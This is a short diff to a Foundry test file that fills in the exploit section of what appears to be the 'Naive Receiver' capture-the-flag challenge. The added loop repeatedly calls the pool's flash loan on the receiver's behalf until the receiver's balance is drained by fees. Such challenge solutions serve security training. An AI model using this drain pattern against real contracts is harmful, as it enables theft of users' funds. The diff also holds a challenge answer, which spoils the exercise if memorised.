@@ -49,7 +49,10 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        uint256 FIXED_FEE = naiveReceiverLenderPool.fixedFee();
+        while (address(flashLoanReceiver).balance >= FIXED_FEE) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
         /** EXPLOIT END **/
         validation();
     }
